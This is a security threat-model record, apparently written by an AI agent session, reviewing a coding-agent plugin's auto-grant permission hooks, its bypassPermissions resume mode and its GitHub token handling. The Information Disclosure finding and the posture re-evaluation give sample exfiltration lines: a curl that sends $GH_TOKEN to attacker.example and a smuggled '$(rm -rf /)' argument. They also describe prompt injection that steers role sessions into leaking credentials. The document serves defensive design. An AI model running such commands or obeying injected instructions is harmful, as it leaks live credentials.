# issue-894 — security-threat-model: permission/auto-grant posture (final posture record)

kind: security-threat-model
canonical: this record's own STRIDE table, posture re-evaluation, and mitigation list below —
read/authored live, this session
loop_state: closed

## What was done

Final-posture STRIDE-style review of the permission/auto-grant design this session built: the
`merge`/`spawn`/`gh-write` allow-hooks, `session-role-bind.sh`'s identity primitive,
`--permission-mode bypassPermissions` on resumed orchestrator sessions (#889), and the
credential-token flow (`_resolve_gh_token`, `resolve_harness_github_token`,
`credential-record-guard.sh`). The original STRIDE table below (unchanged) is this record's first
review round and had rated finding #1 as mitigate-disposition Critical, recommending narrowing
`bypassPermissions` to a command allowlist. The **Posture re-evaluation** section that follows the
table re-rates finding #1 under the operator's REFRAME 2 decision (see Upstream basis) and the
on-the-record model's compensating controls (recorded issue/PR flow, review-before-main, git
revertibility, branch protection), and scopes the one residual guard those controls leave
uncovered: irreversible credential/secret exfiltration.

## Why

issue #894: this session landed a series of security-sensitive, permission-broadening changes
(#816, #823, #859/#869/#874, #889, #862) without ever routing them through security-threat-model.
The orchestrator's own inline reasoning about safety is not a substitute for an explicit threat
model, particularly for a plugin whose entire mechanism is auto-granting elevated Bash capability
by default. This record's original section below is that first review round. Two follow-on
operator directions on the same issue thread (a denylist direction, then REFRAME 2) narrowed the
direction further:

canonical: https://github.com/tokenmaxxxer/on-the-record/issues/894#issuecomment-5258642167
("REFRAME 2") — read live, this session
neither an allowlist nor a denylist of commands is tractable across the diverse target projects
this plugin operates on — REFRAME 2's own text names this as the same class of problem issue
#695's sandbox removal already surfaced — and either one risks breaking autonomous task
completion, a stated non-negotiable. REFRAME 2 is the operator's final call: keep
`bypassPermissions`, lean on the compensating controls the on-the-record model already provides,
and add only a minimal universal guard for the harm class those controls cannot undo. The Posture
re-evaluation section carries that out.

## Upstream basis

- docs/issue-894/proposals/security-threat-model.md (approver action: issue comment body exactly
  `APPROVE issue-894/security-threat-model`)
- docs/issue-894/reports/security-threat-model/survey.md (phase-1 current-state survey)
- https://github.com/tokenmaxxxer/on-the-record/issues/894#issuecomment-5258642167 — operator
  comment "REFRAME 2" (JiwonJung94, 2026-08-11T20:44:22Z), superseding both the prior allowlist
  and denylist directions: keep `bypassPermissions`, re-rate finding #1 under the compensating
  controls, and scope a minimal universal guard for irreversible exfiltration only — the direct
  basis for the Posture re-evaluation section below

## code_under_review

- on-the-record/hooks/merge-allow-gate.sh
- on-the-record/hooks/spawn-allow-gate.sh
- on-the-record/hooks/gh-write-allow-gate.sh
- on-the-record/hooks/credential-record-guard.sh
- on-the-record/hooks/session-role-bind.sh
- spawn.py (`_resume_orchestrator_session`, `_resolve_gh_token`, `_git_env`, role-spawn
  `bypassPermissions` call sites)
- harness/driver.py (`resolve_harness_github_token`, `resolve_harness_github_host`,
  `resume_orchestrator_session`)

## Asset inventory

| Asset | Why it matters |
|---|---|
| Orchestrator identity (`CLAUDE_ROLE` empty) | Gate to merge-allow-gate.sh / gh-write-allow-gate.sh's auto-`allow` — the highest-trust identity in this system |
| `GH_TOKEN` / `NORTHPOLE_HARNESS_GH_TOKEN` | Live GitHub credentials with write scope on the real repo — the one asset a git revert cannot restore once leaked |
| Host permission-prompt default-deny | The fallback that governs every Bash shape the allow-hooks do not recognize |
| `docs/**` tree | The only surface `credential-record-guard.sh` inspects for credential leakage |
| main branch state | Protected by branch rules + the two-account/orchestrator-review gate — the git-revertible, review-before-land surface the compensating controls actually cover |

## Trust boundary map (DFD, prose)

```
[repo content / issue body / PR body]  -- text only, never argv --> [gh CLI args, inert]
[role session (CLAUDE_ROLE set)] --Bash--> [PreToolUse hooks] --allow only--> [host permission engine]
[orchestrator session (CLAUDE_ROLE empty)] --Bash--> [PreToolUse hooks: merge/gh-write/spawn-allow-gate] --allow--> [host permission engine (bypassPermissions on resume: ABSENT)]
[spawn.py / driver.py] --subprocess env--> [GH_TOKEN into role session env + git credential helper]
[any local process sharing $TMPDIR] -.-> [otr-role-bind/<session_id>.json] (write race, see finding #3)
[any session's Bash/WebFetch/network tool call] --credential text--> [attacker-controlled network endpoint] (NOT git-revertible, see Posture re-evaluation)
```

The boundary this review centers on: on a **resumed** orchestrator turn, the host's own
default-deny (which normally backstops every Bash shape the allow-hooks don't recognize) is
replaced by `bypassPermissions`, which has no deny concept at all. The allow-hooks still run and
still only ever emit `allow`, never `deny` — so the boundary that used to catch the residual
case (no `allow` emitted → previously fell to host deny) now has nothing behind it.

canonical: docs/specs/approvers.md, contract v3 §19 (cited in this session's own SessionStart
role-handoff directive text) — read live, this session
The Posture re-evaluation section adds a second boundary this first round under-weighted:
everything upstream of `main` (file writes, commits, branches, even a merged PR) sits inside the
review-before-main/branch-protection/revert path those citations establish; the one arrow in the
diagram above that does not is the last one, a credential leaving the process over the network.

## STRIDE table (ranked most-severe first)

### 1. Elevation of Privilege — `bypassPermissions` on resume removes default-deny outside the allow-hooks' recognized shapes

canonical: spawn.py:2245-2260 (`_resume_orchestrator_session`), harness/driver.py:270-281
(`resume_orchestrator_session`) — read live, this session

**Threat**: a resumed orchestrator turn (`claude -p ... --resume <id> --permission-mode
bypassPermissions`) runs with no host permission prompt at all.

canonical: on-the-record/hooks/merge-allow-gate.sh:1-231,
on-the-record/hooks/spawn-allow-gate.sh:1-177, on-the-record/hooks/gh-write-allow-gate.sh:1-190
— read live, this session
None of the three allow-hooks contains a `"permissionDecision": "deny"` literal or `exit 2` —
each only emits `allow` JSON or a bare `exit 0`. Any Bash shape those three hooks do not
recognize — `gh repo delete`, `git push --force`, `rm -rf`, an arbitrary shell one-liner the
resumed turn itself assembles while reasoning over untrusted repo/issue/PR content — previously
fell through to the host's own default-deny prompt. Under `bypassPermissions` that fallback does
not exist; the resumed turn can run any Bash command with no permission gate whatsoever.

canonical: spawn.py:2245-2260, harness/driver.py:270-281 (in-code comment text) — read live,
this session
The in-code comments assert this precise gap, citing `docs/issue-886/reports/implementation/
hunt-issue-886-permission-mode-fix.md` as the source of the empirical claim.

unverifiable: that hunt record's own claim (bypassPermissions removes the host fallback default-
deny) was cited here by path, not independently re-executed in this review — this record treats it
as asserted-by-citation, per the approved proposal's stated scope boundary (survey:
"bypassPermissions-on-resume: in-repo claim").

**Severity (CVSS-style), original review round**: Critical (9.1) —
AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H. Local-execution vector (requires the resumed process to
exist), low complexity (no special conditions beyond a resume firing), no privileges/interaction
required by an external attacker who can only steer via repo/issue/PR content the resumed turn
reads, scope-changed (crosses from the plugin's own allow-list boundary into unrestricted host
execution), high confidentiality/integrity/availability impact (arbitrary command execution with
the orchestrator's full credentials, including `GH_TOKEN`). **Superseded — see Posture
re-evaluation below for the final rating.**

**Disposition, original review round**: mitigate (완화) — drop `bypassPermissions` on resume,
extend the allow-hooks to cover the genuinely-needed shapes (`git fetch`, etc.), let host
default-deny govern the rest. **Superseded by REFRAME 2 — see Posture re-evaluation below for the
final disposition.**

canonical: spawn.py:2245-2260 (in-code comment text) — read live, this session
The in-code comment already names the two Bash shapes a resume genuinely needs beyond what the
three hooks cover — `gh pr merge`, `git fetch`, and `spawn.py` invocations all get denied under
`acceptEdits` per the comment's own text — so the allowlist direction this round considered is not
"use `acceptEdits`" (file-edit-only, insufficient per the same comment) but extending
`spawn-allow-gate.sh` (or a narrow sibling `git-fetch-allow-gate.sh`) with the same
shape-discipline (shlex + fixed verb shape + orchestrator-identity check, mirroring
merge-allow-gate.sh:91-153) for `git fetch [<remote>] [<refspec>]`.

canonical: https://github.com/tokenmaxxxer/on-the-record/issues/894#issuecomment-5258642167
("REFRAME 2") — read live, this session
REFRAME 2's own text names why this direction was rejected in favor of keeping
`bypassPermissions`: any such allowlist is bounded to the shapes known at write time, and this
issue's own comment thread cites its history (`gh-write` matching patched three times across
#859/#869/#874, with `git fetch`/`gh pr view`/rebase still needed on resume) as the concrete
leaky-bucket evidence.

residual-risk-note (original review round, superseded): Low, contingent on the fix above landing.
This rating and its "pending" approver reference are carried forward for record-continuity only;
the fix itself was never approved or built, and REFRAME 2 supersedes the recommendation. See
Posture re-evaluation for the rating that actually governs.

### 2. Tampering — argument-text smuggling past the shlex/quoted-heredoc checks

canonical: on-the-record/hooks/merge-allow-gate.sh:91-153,
on-the-record/hooks/gh-write-allow-gate.sh:79-171 — read live, this session

**Threat**: could a crafted `--body`, issue title, or repo content smuggle a command past the
allow-hooks' shape checks? All three hooks tokenize the *entire* `tool_input.command` with
`shlex.shlex(cmd, posix=True, punctuation_chars=True)` and require the token list to match one of
a small fixed set of verb shapes (optionally one `cd DIR &&` prefix), rejecting any command
containing a backtick, `$(`, or newline outside one narrow exception (below), and rejecting any
operator token (`;`, `&&` beyond the one tolerated prefix, `|`, `>`, etc.) anywhere in the tail
(merge-allow-gate.sh:99-129, gh-write-allow-gate.sh:125-171).

canonical: on-the-record/hooks/gh-write-allow-gate.sh:82-84 — read live, this session
No token past the verb is ever inspected for content — the comment there states this explicitly
("the decision is keyed on shape, never on argument text"). A malicious `--body "$(rm -rf /)"` is
not smuggled into execution; it is rejected outright by the `$(` check (line 125) before
shape-matching ever runs, and a benign `--body "some text"` is allowed through to `gh` only as an
inert CLI argument (never re-interpreted by a shell) — there is no vector in this design for
argument text to become executed code through this allow path.

canonical: on-the-record/hooks/gh-write-allow-gate.sh:108-123 — read live, this session
The one deliberate exception, `$(cat <<'DELIM' ... DELIM)`, collapses to an inert placeholder
only when (a) it is the command's sole substitution (`len(_subs) == 1`) and (b) nothing outside
the matched span still contains `$(` or a backtick (line 117). A **quoted** heredoc delimiter is
a POSIX primitive that disables all expansion of its body by construction, so the body's own
content (including embedded backticks/`$(` — issue #873's fix) cannot execute anything regardless
of what text it contains; the exception is safe by the shell's own quoting semantics, not by this
hook's parsing correctness alone. The regex's non-greedy body match (`.*?`) stops at the first
line matching the delimiter, matching how a real POSIX shell heredoc reader behaves — a crafted
body containing a line identical to the delimiter does not desync the hook's view from the
shell's own; both terminate the heredoc at the same point.

**Severity**: Informational — no exploitable injection path was surfaced this review over the
scope above; recorded to answer the issue's explicit question rather than as an open threat.

**Disposition**: accept (수용) — the current design is sound by construction (verb-shape matching
+ no argument-text inspection + heredoc quoting semantics). No mitigation needed; residual
exposure is carried by the general fragility of hand-matched shape lists (see finding #4) rather
than this specific injection question. Unaffected by the Posture re-evaluation — this finding
concerns the allow-hooks' own parsing, not the `bypassPermissions` boundary they sit beside.

residual-risk-note: None required — no mitigation applies. approver: N/A — no disposition
requiring a fix sign-off; re-examine if the heredoc regex or shape list changes.

### 3. Elevation of Privilege — role session masquerading as orchestrator identity

canonical: on-the-record/hooks/session-role-bind.sh:1-91,
on-the-record/hooks/merge-allow-gate.sh:131-153 — read live, this session

**Threat**: can a role session (`CLAUDE_ROLE` set at spawn) masquerade as the orchestrator
(`CLAUDE_ROLE` empty) to trigger the auto-`allow` in `merge-allow-gate.sh`/
`gh-write-allow-gate.sh`? For the live-tampering shape the issue names, this review's code reading
says no: `session-role-bind.sh` snapshots `CLAUDE_ROLE` into
`$TMPDIR/otr-role-bind/<sanitized session_id>.json` at `SessionStart` — before any
session-controlled code (including the model's own Bash calls) has run
(session-role-bind.sh:1-15). "First-observation wins" (session-role-bind.sh:64-67): a later
`SessionStart` replay never overwrites an existing snapshot. The allow-hooks then prefer this
snapshot over the live env var (merge-allow-gate.sh:136-151) — so a role session that later
`export`s `CLAUDE_ROLE=""` in its own Bash context still resolves to its bound role via the
snapshot, and the auto-`allow` path (which requires `role` to be falsy at merge-allow-gate.sh:152)
still resolves against the bound role, not the tampered env var.

canonical: on-the-record/hooks/session-role-bind.sh:16-24 — read live, this session
Survey gap this review addresses: `session-role-bind.sh` no-ops (writes no snapshot) whenever
`CLAUDE_ROLE` is unset — i.e., the orchestrator's own sessions never get a snapshot file. This is
intentional (the orchestrator's identity is "no role", represented by absence), but it means the
orchestrator-path identity check ultimately still rests on the live env var when no snapshot
exists (merge-allow-gate.sh:150-151 fallback), same posture as before session-role-bind.sh
existed for that one path. This is not exploitable by a role session directly (its own
session_id's snapshot, once written, cannot be un-written or downgraded — first-observation-wins
protects the role's own binding, not the orchestrator's), but it surfaces a narrower local-
attacker race: two *different* sessions sharing `$TMPDIR` (a shared multi-tenant host, or a
predictable/enumerable `session_id`) let a process with local filesystem write access to
`$TMPDIR` pre-create `otr-role-bind/<future-session_id>.json` with `{"role": ""}` before the real
`SessionStart` fires, and first-observation-wins would make that forged snapshot permanent for
that session.

unverifiable: whether `session_id` is predictable or enumerable before its own `SessionStart`
hook fires — the fetched official docs (survey: "Official-doc facts") establish only that
`session_id` carries no cryptographic binding, not its generation scheme, and this review ran no
further check against the live harness to settle it.

**Severity**: Medium (5.9) — AV:L/AC:H/PR:H/UI:N/S:C/C:L/I:H/A:N. Requires local filesystem
access to `$TMPDIR` (already a privileged local position) and the unresolved `session_id`
prediction/race above; if achievable, grants the orchestrator's own auto-allow surface to an
attacker-controlled process. Unaffected by the Posture re-evaluation: this is a local
identity-spoofing threat, orthogonal to the `bypassPermissions` boundary, and its outcome (an
attacker-controlled process gaining the orchestrator's Bash surface) is itself still covered by
the same compensating controls discussed below for finding #1 — any git-visible action it takes
is reviewable-before-main and revertible.

**Disposition**: mitigate (완화). Recommend: (a) settle `session_id`'s generation/predictability
against the official docs or empirically — an open item this review leaves for the follow-up work
noted below; (b) if `$TMPDIR` can be shared across trust domains on any supported host, move
`OTR_ROLE_BIND_STATE_DIR` to a per-user, mode-0700 directory the hook creates itself rather than
trusting the ambient `$TMPDIR` default; (c) consider writing the orchestrator's own empty-role
snapshot explicitly (rather than relying on absence-of-file) so both identities share the same
first-observation-wins primitive instead of only one of them benefiting from it.

residual-risk-note: Low, contingent on (b)/(c) landing. approver: pending — requires
docs/specs/approvers.md sign-off before (b)/(c) are implemented; residual exposure after
mitigation is bounded by an attacker who already has local `$TMPDIR`-adjacent privilege, a much
narrower threat actor than the current design's exposure.

### 4. Information Disclosure — credential flow scope limited to `docs/**` writes

canonical: spawn.py:3927,4391-4415,4418-4430; harness/driver.py:66-107;
on-the-record/hooks/credential-record-guard.sh:1-114 — read live, this session

**Threat**: `_resolve_gh_token()` shells out to `gh auth token` once per process and injects the
result as `GH_TOKEN` into every role session's environment (spawn.py:3927) and into the
orchestrator's own git credential-helper env (`_git_env()`, spawn.py:4418+).
`resolve_harness_github_token()` does the same for a second, separate credential
(`NORTHPOLE_HARNESS_GH_TOKEN`, harness/driver.py:66-84). `credential-record-guard.sh` denies a
`docs/**` write whose content matches a full-length GitHub/OpenAI/AWS credential pattern
(including a MultiEdit fragment-concatenation check) — but its guard scope is `docs/**` writes
only; it does not inspect Bash command text, subprocess stdout/stderr, WebFetch/network tool
input, or any non-`docs/` file write. A role session that (deliberately or via a prompt-injected
instruction from untrusted repo/issue content) echoes `$GH_TOKEN` into a Bash command
(`curl ... -H "Authorization: token $GH_TOKEN" https://attacker.example`) or writes it to a
non-`docs/` file has no guard at all along that path.

canonical: on-the-record/hooks/hooks.json — read live, this session

```bash
grep -n '"matcher"' on-the-record/hooks/hooks.json
```

**Severity**: High (7.5) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N. Requires a role session to be
steered (by prompt injection from repo/issue/PR content it reads, since `CLAUDE_ROLE` sessions
are the ones granted `GH_TOKEN`) into exfiltrating the token via a channel `credential-record-
guard.sh` does not cover; high confidentiality impact given the token's write scope on the real
repo. This is the finding the Posture re-evaluation below builds directly on: unlike findings
#1/#3/#5/#6, its impact — a token leaving the process over the network — is the one class of harm
in this record that the compensating controls (git revert, review-before-main, branch protection)
do not undo, because the leak already occurred before any of those controls ever engage.

**Disposition**: mitigate (완화). Recommend scoping the token more narrowly than a live user
token where possible (e.g., a repo-scoped, short-lived, or fine-grained PAT for role sessions
that only need `gh issue`/`gh pr` write operations, rather than whatever scope `gh auth token`
returns for the orchestrator's own authenticated identity), and extending a credential-pattern
guard to the Bash-command and network-tool-input surface, not only `docs/**` writes — see the
Posture re-evaluation's Recommended minimal guard for the concrete shape. A `transfer`
disposition to the hosting environment's own network egress controls remains an option worth
scoping — noted here since this review did not verify whether such a control exists.

residual-risk-note: Medium, contingent on the mitigations above landing. approver: pending —
docs/specs/approvers.md sign-off required before scope-narrowing or extended guard coverage
lands; even after mitigation, a role session retains a live, if narrower, credential in its own
process env by design (necessary for its `gh`-issuing job), so residual exposure to a
sufficiently steered role session does not reach Low.

### 5. Repudiation — auto-granted actions leave an attributable trail

canonical: on-the-record/hooks/merge-allow-gate.sh:214-224,
on-the-record/hooks/gh-write-allow-gate.sh:173-183 (permissionDecisionReason emission) — read
live, this session

**Threat**: does an auto-granted action leave a record of why it was granted? Both
`merge-allow-gate.sh` and `gh-write-allow-gate.sh` emit a `permissionDecisionReason` string
(e.g. "merge-allow-gate: PR #%s is landing_readiness=READY ... issue #810") into the hook's own
JSON output, and the underlying `gh` action itself remains independently visible in GitHub's own
PR/issue timeline (author, timestamp) regardless of this plugin. This review's reading of the two
hooks surfaces no repudiation gap beyond the observation that the hook's own reasoning string has
no durable home outside the tool-call transcript for that turn — it is not written to a separate
audit log by these scripts.

**Severity**: Low (2.7) — AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N. Minor traceability gap (the
reasoning string's only durable home is the transcript, not a separate audit log), not an
attribution failure.

**Disposition**: accept (수용). The GitHub-side action record is the durable audit trail; the
hook's reason string is a debugging aid for the *decision*, not the *action*, and duplicating it
into a separate log is not proportionate to the risk here. This is itself an instance of the
compensating-controls argument the Posture re-evaluation generalizes: the git/GitHub record is
what carries attribution here, not the plugin's own logging.

residual-risk-note: Low, unchanged (no mitigation applied). approver: N/A —
no fix proposed, so no sign-off required; re-open if a future finding needs a durable
decision-reason audit trail.

### 6. Denial of Service — out of scope, no DoS-shaped gap surfaced

canonical: docs/issue-894/proposals/security-threat-model.md ("Out of scope" section) — read
live, this session

Per the issue's own framing (permission/auto-grant review, not availability) and the approved
proposal's Out of scope section, DoS was not deep-dived this review. This review's incidental reading
of the six reviewed artifacts (findings #1-#5 above) surfaces no unbounded-retry or
resource-exhaustion pattern that would warrant reopening this as an in-scope finding.

**Disposition**: accept (수용) — explicitly out of scope per the approved proposal; not evaluated
this review.

residual-risk-note: N/A — not evaluated this review. approver: N/A.

## Posture re-evaluation (REFRAME 2, final)

### The compensating controls, and what they neutralize

canonical: https://github.com/tokenmaxxxer/on-the-record/issues/894#issuecomment-5258642167
("REFRAME 2") — read live, this session

REFRAME 2 names four compensating controls the on-the-record model already runs, independent of
any command-level permission check:

1. **Recorded issue/PR flow** — every change this plugin's roles produce is tied to a GitHub
   issue and lands as a PR, per role-handoff contract v3 (cited directly in this session's own
   SessionStart directives).
2. **Review-before-main** — nothing unreviewed reaches `main`: the orchestrator-as-reviewer /
   two-account Approve-gate mechanism (contract v3 §19, docs/specs/approvers.md) gates phase-2
   work, and branch protection (control 4) backstops it structurally, not just by convention.
3. **Git revertibility** — every change is a commit; a bad commit, a bad merge, even a bad
   `rm -rf` inside the working tree is undoable via git history as long as the write happened
   inside the repo's own tracked tree.
4. **Branch protection** — `main` itself is not a write target any role session's Bash surface
   can reach directly; landing requires the PR path, which controls 1-2 already gate.

**What this neutralizes, by STRIDE category, ranked by how completely the controls cover it**:

- **Tampering (finding #2) and most Elevation-of-Privilege paths that operate through the
  repo** (finding #1's *file/branch-mutation* half, finding #3's downstream Bash actions): fully
  neutralized in the sense that matters for irrecoverability. An attacker (or a steered session)
  that runs `rm -rf`, force-pushes, deletes a branch, or lands a malicious commit produces an
  artifact that is itself inside git history — reviewed-before-main catches it before `main`
  moves, and revert undoes it even in the cases that slip through. The compensating controls do
  not make the action impossible (that was finding #1's original framing), but they make its
  *effect* recoverable, which is the property that actually matters once "the agent's permissions
  are open by design" is the accepted baseline.
- **Repudiation (finding #5)**: neutralized by the same mechanism finding #5 already names — the
  GitHub-side PR/issue record is itself the durable audit trail controls 1-2 produce as a
  byproduct.
- **Denial of Service (finding #6)**: out of scope per the original proposal; the compensating
  controls are not centrally about availability and this re-evaluation does not extend into it.
- **Information Disclosure via a git-visible surface** (e.g. a credential accidentally committed
  to a tracked file): neutralized to the same degree as tampering above — `credential-record-guard.sh`
  (finding #4) already denies the write before it lands, and even a landed one is
  reviewable-before-main and (once identified) revocable/revertible.
- **Information Disclosure via a non-git-visible surface** (finding #4's actual threat — a
  credential leaving the process over the network, or written outside any tracked/reviewed path):
  **not neutralized**. None of the four controls touch this path — there is nothing to review,
  nothing to revert, because the harm already occurred before the control could engage. This is
  the residual the rest of this section scopes.

### Finding #1, re-rated

**Severity, re-rated under compensating controls**: High (7.2), down from the original round's
Critical (9.1) — AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H. The vector, complexity, privilege, and
scope-change axes are unchanged from the original CVSS vector (a resumed turn with no permission
gate is still local-vector, low-complexity, scope-changed). What moves is confidentiality and
integrity impact: High→Low on both, because the actions a resumed turn can now take that
originally scored C:H/I:H — arbitrary file mutation, branch/commit tampering, `gh` write calls —
are git-tracked or GitHub-tracked actions the compensating controls catch
before-main-and-revert-after. Availability stays High (A:H) because an in-process action (e.g. an
infinite loop, a runaway resource-consuming command) is not something review-before-main or
revert addresses — but DoS is this record's explicitly out-of-scope class (finding #6), so this
factor does not drive the disposition below. The one impact this re-rating does **not** discount
is a resumed turn's Bash surface being used for network exfiltration of `GH_TOKEN` or another
secret — that residual is carried forward as its own item below, not folded back into finding #1's
number, because it is a narrower and different threat than "arbitrary command execution" (it does
not need `bypassPermissions` specifically; any Bash-capable session with the credential in its env
can attempt it, per finding #4).

**Disposition, re-rated**: accept (수용) — supersedes the original round's mitigate disposition.
Per REFRAME 2, dropping `bypassPermissions` in favor of an allow-hook enumeration is rejected as
intractable (the same class of problem REFRAME 2's own text ties to issue #695's sandbox removal)
and risks the non-negotiable of breaking autonomous completion. The residual Critical-shaped harm
this finding originally worried about (unrestricted command execution) is accepted as a designed
property of the trusted-operator-proxy model, backstopped by the compensating controls above for
every git-visible consequence.

residual-risk-note: High (7.2), accepted as-is under the compensating controls (no further
mitigation planned for the command-execution surface itself). approver: pending —
this re-rating requires docs/specs/approvers.md sign-off (contract v3 §19 Approve gate) before it
governs; until then, the original round's mitigate/Critical entry in the Mitigation list below is
struck through but not deleted, per record-continuity, and this re-rated row is authoritative for
posture purposes per the operator's REFRAME 2 direction to this session.

### The residual that escapes the compensating controls: irreversible exfiltration

Everything the compensating controls cover shares one property: the harmful state lives inside a
system (git, GitHub) that itself has a review gate and an undo. Credential/secret exfiltration
does not have that property — once `GH_TOKEN` (or any other secret in a session's process
environment) reaches an attacker-controlled network endpoint, no PR review, no revert, and no
branch protection rule un-leaks it. The token stays compromised until someone notices and rotates
it out of band; on-the-record's own git-native controls have no purchase on that timeline at all.

canonical: on-the-record/hooks/credential-record-guard.sh:1-114 — read live, this session

**Current coverage, assessed this review**: `credential-record-guard.sh` (finding #4) is scoped
to `PreToolUse` on `Write|Edit|MultiEdit` whose `file_path` matches `docs/**`
(credential-record-guard.sh:44-46). It has no matcher on `Bash` and no matcher on `WebFetch` or
any other network-capable tool. A prompt-injected instruction from untrusted repo/issue/PR
content that gets a role session to run
`curl -H "Authorization: token $GH_TOKEN" https://attacker.example/collect` — or to `WebFetch` a
URL with the token appended as a query parameter — would go through with no guard evaluating it
at all, because no PreToolUse hook registered for those tool names inspects command/URL text for
a credential pattern. This is the gap finding #4 already surfaced; the Posture re-evaluation
promotes it from "one mitigate-disposition finding among six" to the single residual this record
treats as still meriting an always-on structural guard, because it is the one harm class the
accepted-full-permissions baseline cannot self-heal from.

**Recommended minimal universal guard (scoped narrowly — not a command allowlist/denylist)**:

canonical: on-the-record/hooks/credential-record-guard.sh:1-114 (existing pattern set and
fail-closed shape) — read live, this session

1. Extend `credential-record-guard.sh`'s pattern set to a new `PreToolUse` matcher on `Bash`
   (and `WebFetch` if its `tool_input` carries a URL/body field), checking the same
   already-defined credential regexes (`gh[oprs]_...`, `github_pat_...`, `sk-...`, `AKIA...`)
   against `tool_input.command` (Bash) or `tool_input.url`/any string field (WebFetch). This is a
   *content-pattern* check, structurally identical to the existing `docs/**` guard — it never
   inspects or restricts which command/URL shape is used, only whether a full-length credential
   literal appears in it. That keeps it categorically different from the rejected command
   allowlist/denylist: it does not enumerate safe or dangerous commands, it detects one narrow
   content shape (a live secret literal) regardless of what command carries it.
2. canonical: on-the-record/hooks/credential-record-guard.sh:99-107 (existing `deny()`/`exit 2`
   shape) — read live, this session. Deny outright on a match, mirroring that existing fail-closed
   shape, rather than attempting to strip the credential from an otherwise-permitted command — a
   network call is a single atomic operation with no meaningful "the credential part failed, the
   rest of the curl proceeded" partial-success case to preserve.
3. Scope to known-live credential shapes only (the same four patterns already in
   `credential-record-guard.sh`, extendable per-repo as new credential types are introduced) —
   this stays a small, stable, universal set precisely because it does not try to enumerate
   dangerous *commands*, only recognizable *secret literals*, which is what makes it tractable
   across arbitrary target projects in a way a command allowlist is not.

residual-risk-note: Medium, pending this guard's implementation (not yet built — this is a
recommendation of this record, not a delivered fix). approver: pending —
requires docs/specs/approvers.md sign-off (contract v3 §19 Approve gate) before implementation
work is opened as its own work unit; even after this guard lands, residual exposure to a
sufficiently obfuscated exfiltration channel (e.g. a credential split across multiple tool calls,
base64-encoded, or exfiltrated via a side channel this pattern-match does not recognize) does not
reach Low — this is a floor-raising content filter, not a proof of no exfiltration path, exactly
as `credential-record-guard.sh`'s own `docs/**` scope is today.

### Residuals ranked under the compensating controls (final)

| Rank | Residual | Why it ranks here under compensating controls |
|---|---|---|
| 1 | Credential/secret network exfiltration (finding #4's uncovered half) | Only harm class not neutralized by review-before-main/revert/branch-protection — irreversible by construction |
| 2 | `bypassPermissions`-enabled command execution, re-rated (finding #1) | Git-visible consequences are reviewable-before-main and revertible; accepted as the designed cost of the trusted-operator-proxy model |
| 3 | Role-session masquerade via `$TMPDIR` race (finding #3) | Requires existing local privilege; any resulting git-visible action inherits finding #1's same compensating-control coverage |
| 4 | Repudiation gap (finding #5) | Already neutralized by the GitHub-side record; accepted, no residual of consequence |
| 5 | DoS (finding #6) | Out of scope; not evaluated |

## Mitigation list (disposition summary)

| # | Finding | Disposition | residual-risk-note |
|---|---|---|---|
| 4 | Info disclosure — irreversible exfiltration via Bash/network (uncovered by `credential-record-guard.sh`'s `docs/**` scope) | mitigate (완화) — minimal content-pattern guard, not a command list | Medium, pending approver sign-off |
| 1 | EoP — `bypassPermissions` on resume, re-rated under compensating controls | accept (수용) — supersedes original mitigate disposition per REFRAME 2 | High (7.2), accepted as-is, pending approver sign-off |
| 3 | EoP — role-session masquerade via `$TMPDIR` race | mitigate (완화) | Low, pending approver sign-off |
| 2 | Tampering — argument-text smuggling | accept (수용) | None required |
| 5 | Repudiation — decision-reason not durably logged | accept (수용) | Low, unchanged |
| 6 | DoS — out of scope | accept (수용) | N/A |

Note: finding #1's row above (accept/High) supersedes this record's earlier internal
mitigate/Critical rating for the same finding, per the Posture re-evaluation section; the
earlier rating is kept only in finding #1's own STRIDE-table entry, marked superseded there, for
record-continuity.

## Open findings

- Finding #1's re-rating (accept/High) and finding #4's new minimal-guard recommendation both
  carry `approver: pending` — the residual-risk-notes above are proposed ratings, not yet signed
  off per docs/specs/approvers.md (contract v3 §19).
- Finding #3: whether `session_id` is predictable/enumerable before `SessionStart` fires was left
  unverifiable this review (see the `unverifiable:` line in finding #3 above); settling it would
  let the residual-risk-note tighten or the finding drop.
- The minimal exfiltration guard recommended in the Posture re-evaluation is not yet implemented —
  it is this record's fix recommendation, a separate follow-on work unit.
- Step 2 of issue #894 (structural enforcement — a board-condition/gate requiring a
  security-threat-model record before a trust-boundary change can land) sits explicitly outside
  this record's scope per the approved proposal; hands off to a future security-threat-model or
  orchestration-design work unit.

## Next steps

1. Get approver sign-off (docs/specs/approvers.md, contract v3 §19 Approve gate) on finding #1's
   re-rated accept/High disposition and on the Posture re-evaluation's recommended minimal
   exfiltration guard, since both currently carry `approver: pending`.
2. Once approved, open an implementation work unit to extend `credential-record-guard.sh` (or add
   a narrow sibling hook) with a `Bash`/`WebFetch` matcher over the same credential-pattern set,
   per the Posture re-evaluation's "Recommended minimal universal guard" section.
3. Settle the `session_id` predictability question (finding #3) before deciding whether the
   `$TMPDIR`-race mitigation is load-bearing or precautionary.
4. Design step 2 (structural enforcement of security-threat-model for trust-boundary changes) as
   its own proposal, informed by this record's finding set as the concrete "what must be caught"
   list.

## Resolution path (for open findings)

Each open finding above resolves either by a follow-up implementation PR (finding #4's minimal
guard, finding #3 partially) whose citation shows the fix landed in code, or by a named approver's
docs/specs/approvers.md sign-off recording the residual-risk-note as accepted-as-is (finding #1's
re-rated accept/High, finding #3/#4's "pending" approver references, once a named approver
reviews this record).

## Canon references

- code.claude.com/docs/en/hooks — external canon establishing: `session_id` carries no
  cryptographic binding (informs findings #1/#3's identity-trust analysis); documented
  `permissionDecision` values (`allow`/`deny`/`ask`/`defer`); `PreToolUse` fires on every tool
  call including under `bypassPermissions` (the payload still reaches the allow-hooks, informing
  the "hooks still run" boundary in finding #1, and the basis for why a `Bash`/`WebFetch`
  credential-pattern guard in the Posture re-evaluation would still fire even on a resumed,
  bypassPermissions-mode turn).

canonical: WebFetch https://code.claude.com/docs/en/hooks — executed live, this session,
2026-08-12
The fetch did not resolve whether a hook's `deny` is honored under `bypassPermissions` — flagged
there as an unresolved excerpt gap, not re-derived in this review since no hook reviewed here emits
`deny` regardless. This gap is directly relevant to the recommended minimal exfiltration guard's
implementation, since a `deny` that is silently ignored under `bypassPermissions` would need a
different enforcement point (e.g. a non-bypassable pre-check) — flagged for the follow-on
implementation work unit, not resolved here.
- code.claude.com/docs/en/headless.md ("Background tasks at exit" section) — external canon cited
